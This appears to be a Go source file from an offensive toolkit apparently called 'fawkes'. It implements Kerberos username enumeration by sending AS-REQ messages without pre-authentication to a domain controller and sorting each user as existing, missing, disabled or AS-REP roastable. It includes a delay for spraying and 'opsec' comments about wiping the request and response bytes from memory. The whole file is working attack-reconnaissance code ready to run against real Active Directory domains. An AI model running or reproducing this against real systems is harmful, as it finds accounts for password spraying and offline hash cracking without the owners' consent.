package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	krbconfig "github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// sprayEnumEntry represents a user enumeration result for JSON output
type sprayEnumEntry struct {
	Username string `json:"username"`
	Status   string `json:"status"` // "exists", "asrep", "not_found", or error string
	Message  string `json:"message"`
}

func sprayEnumerate(args sprayArgs, users []string) structs.CommandResult {
	realm := strings.ToUpper(args.Domain)
	krb5Conf := buildKrb5Config(realm, args.Server)
	cfg, err := krbconfig.NewFromString(krb5Conf)
	if err != nil {
		return errorf("Error creating Kerberos config: %v", err)
	}

	var entries []sprayEnumEntry
	for i, user := range users {
		if i > 0 {
			sprayDelay(args)
		}

		status := enumKerberosUser(cfg, realm, args.Server, user)
		var message string
		switch status {
		case "exists":
			message = "Pre-auth required"
		case "asrep":
			message = "NO PRE-AUTH — AS-REP roastable"
		case "not_found":
			message = "User not found"
		default:
			message = status
		}
		entries = append(entries, sprayEnumEntry{
			Username: user,
			Status:   status,
			Message:  message,
		})
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error marshaling results: %v", err)
	}

	return successResult(string(data))
}

func enumKerberosUser(cfg *krbconfig.Config, realm, kdc, username string) string {
	// Build AS-REQ without pre-auth data (same technique as AS-REP roasting)
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{username},
	}

	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	asReq.PAData = types.PADataSequence{}

	reqBytes, err := asReq.Marshal()
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	defer structs.ZeroBytes(reqBytes) // opsec: zero Kerberos AS-REQ bytes

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:88", kdc), 10*time.Second)
	if err != nil {
		return fmt.Sprintf("connection error: %v", err)
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return fmt.Sprintf("deadline error: %v", err)
	}

	// Send length-prefixed AS-REQ
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return fmt.Sprintf("send error: %v", err)
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return fmt.Sprintf("send error: %v", err)
	}

	// Read response
	if _, err := sprayReadFull(conn, lenBuf); err != nil {
		return fmt.Sprintf("read error: %v", err)
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1<<20 {
		return "response too large"
	}

	respBytes := make([]byte, respLen)
	if _, err := sprayReadFull(conn, respBytes); err != nil {
		return fmt.Sprintf("read error: %v", err)
	}
	defer structs.ZeroBytes(respBytes) // opsec: zero Kerberos KDC response

	// Try to unmarshal as AS-REP (user exists AND has no pre-auth)
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBytes); err == nil {
		return "asrep" // User exists and is AS-REP roastable
	}

	// Must be a KRBError — check the error code
	errCode := extractKrbErrorCode(respBytes)
	switch errCode {
	case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
		return "not_found"
	case 24: // KDC_ERR_PREAUTH_FAILED
		return "exists" // This shouldn't happen without creds, but handle it
	case 25: // KDC_ERR_PREAUTH_REQUIRED
		return "exists"
	case 18: // KDC_ERR_CLIENT_REVOKED
		return "disabled/locked"
	default:
		return fmt.Sprintf("krb_error_%d", errCode)
	}
}

// extractKrbErrorCode extracts the error-code from a raw KRB-ERROR ASN.1 message.
// KRB-ERROR ::= [APPLICATION 30] SEQUENCE { ... error-code [6] Int32, ... }
func extractKrbErrorCode(data []byte) int {
	// Quick scan: find context tag [6] (0xa6) followed by length and INTEGER (0x02)
	for i := 0; i < len(data)-4; i++ {
		if data[i] == 0xa6 {
			// Context tag [6] — next byte is length, then INTEGER tag
			innerStart := i + 2
			if innerStart < len(data) && data[innerStart] == 0x02 {
				// INTEGER tag — next byte is length, then value
				intLen := int(data[innerStart+1])
				valStart := innerStart + 2
				if valStart+intLen <= len(data) && intLen <= 4 {
					val := 0
					for j := 0; j < intLen; j++ {
						val = (val << 8) | int(data[valStart+j])
					}
					return val
				}
			}
		}
	}
	return -1
}

func sprayReadFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}
